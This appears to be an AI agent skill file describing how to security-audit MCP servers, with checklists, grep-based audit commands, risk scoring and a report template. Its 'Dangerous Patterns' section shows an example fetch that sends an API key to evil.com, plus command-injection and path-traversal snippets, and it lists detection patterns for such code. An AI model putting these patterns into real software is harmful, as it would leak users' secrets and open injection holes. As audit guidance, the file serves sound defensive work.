---
name: skill-mcp-security-audit
description: Security audit for MCP (Model Context Protocol) servers. Detect data exfiltration risks, command injection, permission escalation, and supply chain vulnerabilities before adding MCP servers to your agent. Trigger on: 'audit MCP', 'MCP security', 'check MCP server', 'scan MCP'.
metadata:
  openclaw:
    requires: {}
---

# MCP Security Audit 🔒

> Don't blindly trust MCP servers. Audit them first.

## The Problem

MCP (Model Context Protocol) servers give AI agents powerful capabilities - file access, API calls, code execution. But they can also:

- **Exfiltrate data** to external servers
- **Execute arbitrary commands** on your machine
- **Access files** beyond intended scope
- **Chain vulnerabilities** for privilege escalation

**Real incident:** CVE-2026-23744 exposed MCP injection vulnerabilities. Supply chain attacks via compromised MCP packages are a growing threat.

## Quick Audit Checklist

### 1. Source Verification ✅

```
□ Is this an official/verified package?
□ Check npm/PyPI download counts and maintainer history
□ Review recent commits for suspicious changes
□ Verify package signature if available
```

### 2. Network Audit 🌐

```
□ List all external URLs/domains the MCP connects to
□ Check for hardcoded API endpoints
□ Verify TLS certificate validation is enabled
□ Flag any data sent to unknown domains
```

### 3. File Access Audit 📁

```
□ What directories can the MCP read/write?
□ Is access scoped to project directory only?
□ Check for path traversal vulnerabilities
□ Flag any access to ~/.ssh, ~/.config, env files
```

### 4. Command Execution Audit ⚡

```
□ Does the MCP execute shell commands?
□ Are commands user-controlled or hardcoded?
□ Check for command injection vectors
□ Verify sandboxing/isolation if present
```

### 5. Permission Scope Audit 🔑

```
□ What permissions does the MCP request?
□ Are permissions minimal (principle of least privilege)?
□ Check for excessive scope requests
□ Verify user consent for sensitive operations
```

### 6. Dependency Audit 📦

```
□ Run npm audit / pip-audit / cargo audit
□ Check for known CVEs in dependencies
□ Flag outdated packages with security fixes
□ Review transitive dependencies
```

## Audit Commands

### For npm-based MCP servers:

```bash
# Check package.json for suspicious scripts
cat package.json | jq '.scripts'

# Audit dependencies
npm audit

# Check for post-install scripts
cat package.json | jq '.scripts.postinstall, .scripts.preinstall'

# List network calls (requires grep)
grep -r "fetch\|axios\|http\|https\|ws://" src/ --include="*.js" --include="*.ts"
```

### For Python MCP servers:

```bash
# Check requirements.txt for suspicious packages
cat requirements.txt

# Audit dependencies
pip-audit

# Check for network calls
grep -r "requests\|urllib\|httpx\|aiohttp" src/ --include="*.py"

# Check for subprocess calls
grep -r "subprocess\|os.system\|exec\|eval" src/ --include="*.py"
```

## Risk Scoring

| Category | Weight | High Risk Indicators |
|----------|--------|---------------------|
| Network | 30% | Unknown domains, no TLS, data exfil patterns |
| File Access | 25% | Home dir access, path traversal, sensitive files |
| Command Exec | 25% | Unsanitized input, shell=True, arbitrary commands |
| Dependencies | 15% | Known CVEs, unmaintained packages |
| Source | 5% | Unverified maintainer, recent ownership change |

**Score ≥ 70**: High risk - Do not use without review
**Score 40-69**: Medium risk - Use with caution
**Score < 40**: Low risk - Generally safe

## Red Flags 🚩

Immediately reject MCP servers with:

1. **Obfuscated code** - `eval(atob('...'))` or similar
2. **Dynamic code loading** - Loading code from remote URLs
3. **Environment variable exfil** - Sending `process.env` or `os.environ` externally
4. **Credential harvesting** - Asking for passwords/tokens unnecessarily
5. **No source code** - Binary-only distributions without reproducible builds

## Audit Report Template

```markdown
# MCP Security Audit Report

**Server**: [name]
**Version**: [version]
**Audited**: [date]
**Risk Score**: [score]/100

## Findings

### Critical
- [list critical issues]

### High
- [list high issues]

### Medium
- [list medium issues]

### Low
- [list low issues]

## Recommendations

1. [recommendation]
2. [recommendation]

## Verdict

[ ] APPROVED - Safe to use
[ ] APPROVED WITH CAUTION - Review recommendations
[ ] REJECTED - Too many risks
```

## Common MCP Security Patterns

### Safe Patterns ✅

```javascript
// Scoped file access
const allowedDir = path.resolve(process.cwd(), 'data');
if (!filePath.startsWith(allowedDir)) throw new Error('Access denied');

// Sanitized commands
const allowedCommands = ['git', 'npm', 'node'];
if (!allowedCommands.includes(cmd)) throw new Error('Command not allowed');

// Explicit user consent
if (!await askUserConsent('Allow access to X?')) return;
```

### Dangerous Patterns ❌

```javascript
// DON'T: Unrestricted file read
fs.readFileSync(userInput); // Path traversal!

// DON'T: Shell injection
exec(`git ${userBranch}`); // Command injection!

// DON'T: Credential exposure
fetch('https://evil.com/steal?token=' + process.env.API_KEY);
```

## Integration with CI/CD

Add to your workflow:

```yaml
# .github/workflows/mcp-audit.yml
name: MCP Security Audit
on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Audit MCP servers
        run: |
          # Add your audit commands here
          npm audit
          # Check for suspicious patterns
          grep -r "eval\|exec\|process.env" mcp-servers/ && exit 1
```

## Related Skills

- **prompt-guard** - Protect against prompt injection
- **skill-error-recovery** - Handle MCP connection failures gracefully
- **token-budget-guard** - Monitor MCP token usage

## References

- [MCP Specification](https://modelcontextprotocol.io)
- [OWASP Top 10 for LLMs](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)

---

**Remember**: Every MCP server you add expands your agent's attack surface. Audit before you trust.
